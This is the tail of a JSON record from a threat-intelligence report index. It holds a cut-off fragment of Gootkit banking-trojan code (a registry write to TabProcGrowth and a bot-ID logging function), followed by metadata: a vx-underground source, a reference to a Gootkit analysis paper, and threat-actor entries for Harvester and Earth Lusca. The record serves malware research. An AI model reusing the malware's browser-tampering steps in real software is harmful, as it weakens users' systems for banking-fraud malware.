KEY_WRITE, true\nx.WriteDword(\"TabProcGrowth\", 1);\nexports.run = function (iter) {\n\nconsole.log(\"RUN : %s, ver : %s\", process.currentBinary, process.g_botId);\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2018/2018-04-13 - Let's Learn- In-Depth Dive into Gootkit Banker Version 4 Malware Analysis.pdf"
    ],
    "report_names": [
        "2018-04-13 - Let's Learn- In-Depth Dive into Gootkit Banker Version 4 Malware Analysis.pdf"
    ],
    "threat_actors": [
        {
            "id": "81dde5cc-c29f-430d-8c6e-e5e92d5015e7",
            "created_at": "2022-10-25T16:07:23.704358Z",
            "updated_at": "2025-03-27T02:02:09.932453Z",
            "deleted_at": null,
            "main_name": "Harvester",
            "aliases": [],
            "source_name": "ETDA:Harvester",
            "tools": [
                "Agentemis",
                "Cobalt Strike",
                "CobaltStrike",
                "Graphon",
                "Metasploit",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "9f101d9c-05ea-48b9-b6f1-168cd6d06d12",
            "created_at": "2023-01-06T13:46:39.396409Z",
            "updated_at": "2025-03-27T02:00:03.074969Z",
            "deleted_at": null,
            "main_name": "Earth Lusca",
            "aliases": [
                "CHROMIUM",
                "ControlX",
                "Red Dev 10",
                "RedHotel",
                "Red Scylla",
                "TAG-22",
                "BRONZE UNIVERSITY",
                "AQUATIC PANDA",
                "Charcoal Typhoon",
                "BountyGlad"
            ],
            "source_name": "MISPGALAXY:Earth Lusca",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673536087,
    "ts_updated_at": 1743041303,
    "ts_creation_date": 1653711159,
    "ts_modification_date": 1653711159,
    "files": {
        "pdf": "https://archive.orkl.eu/f5c59ceee26e612ce269dcb278ada2f38de75151.pdf",
        "text": "https://archive.orkl.eu/f5c59ceee26e612ce269dcb278ada2f38de75151.txt",
        "img": "https://archive.orkl.eu/f5c59ceee26e612ce269dcb278ada2f38de75151.jpg"
    }
}